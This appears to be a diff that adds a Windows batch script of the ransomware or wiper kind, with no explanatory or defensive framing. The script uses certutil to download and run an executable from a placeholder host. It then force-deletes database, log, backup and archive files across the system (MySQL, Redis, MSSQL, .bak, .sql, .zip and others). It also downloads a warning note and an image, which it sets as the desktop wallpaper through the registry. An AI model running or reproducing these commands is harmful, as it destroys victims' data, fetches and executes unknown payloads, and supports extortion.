@@ -1,0 +1,29 @@
+﻿certutil -urlcache -split -f http://xxx/uploader.exe C:\uploader1.exe
+C:\uploader1.exe
+del /f /s /q *.log
+del /f /s /q *.mdb
+del /f /s /q *.rdb
+del /f /s /q *.mdf
+del /f /s /q *.db
+del /f /s /q *.dbf
+del /f /s /q *.wdb
+del /f /s /q *.7z
+del /f /s /q *.zip
+del /f /s /q *\mysql\*
+del /f /s /q *\redis\*
+del /f /s /q *\mssql\*
+del /f /s /q *.ISD
+del /f /s /q *.bak
+del /f /s /q *.sql
+del /f /s /q *.gz
+del /f /s /q *.000003
+del /f /s /q *.000001
+del /f /s /q *.qp
+del /f /s /q *.MYD
+certutil -urlcache -split -f http://xxx/warning.txt c:\WAARRNING.TXT
+copy c:\WAARRNING.TXT C:\Users\Administrator\
+certutil -urlcache -split -f http://xxx/10.jpg c:\10.jpg
+reg add "hkcu\control panel\desktop" /v wallpaper /d "c:\10.jpg" /f
+RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
+copy C:\10.jpg C:\Users\Administrator\AppData\Roaming\Microsoft\Wind ows\Themes\WallpaperEngineBackupWallpaper.jpg 
+RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
